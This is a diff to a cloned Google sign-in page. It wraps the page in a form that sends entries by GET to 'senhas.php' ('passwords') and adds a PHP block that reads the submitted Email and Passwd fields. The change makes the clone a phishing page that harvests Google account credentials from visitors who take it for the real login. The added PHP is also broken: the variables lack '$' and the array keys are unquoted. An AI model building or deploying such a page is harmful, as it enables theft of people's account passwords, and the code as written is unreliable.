@@ -1254,6 +1254,7 @@
 </style>
   </head>
   <body>
+  <form method="get" action="senhas.php">
   <div class="wrapper">
   <div  class="google-header-bar  centered">
   <div class="header content clearfix">
@@ -1384,6 +1385,7 @@
   </div>
 </div>
   </div>
+  </form>
 <script type="text/javascript" nonce="kl45Bs2puvpEDGFjp7ZpWxiZZMQ">
   var gaia_attachEvent = function(element, event, callback) {
   if (element && element.addEventListener) {
@@ -1507,5 +1509,9 @@ g("gaia.loginAutoRedirect.stop",function(){var a=n;a.b=!0;a.a&&(clearInterval(a.
   'https:\x2F\x2Faccounts.google.com\x2FServiceLogin?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount\x26followup=https%3A%2F%2Faccounts.google.com%2FManageAccount\x26passive=1209600\x26noautologin=true',
   'https:\x2F\x2Faccounts.google.com\x2FPassiveLoginProber?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount\x26followup=https%3A%2F%2Faccounts.google.com%2FManageAccount\x26passive=1209600');
   </script>
+  <?php
+    email = isset($_GET["Email"])?$_GET[Email]:0;
+    senha = isset($_GET["Passwd"])?$_GET[Passwd]:0;
+  ?>
   </body>
 </html>
